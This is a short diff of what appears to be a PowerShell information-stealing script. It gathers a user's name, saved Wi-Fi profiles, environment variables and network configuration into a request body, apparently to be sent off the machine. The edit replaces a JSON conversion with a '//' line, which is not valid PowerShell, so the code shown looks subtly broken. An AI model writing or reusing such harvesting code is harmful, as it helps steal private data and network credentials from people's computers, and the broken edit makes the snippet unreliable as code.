@@ -23,7 +23,8 @@ gci env:* | ForEach-Object {
 $Body = @{
   'username' = $env:username
   'wifi_profiles' = $wifis
-  'env' = $envVars | ConvertTo-Json
+  'env' = $envVars
+  // | ConvertTo-Json
   'ipv4' = $IPV4
   'ipconfig' = $IPconfig
 }
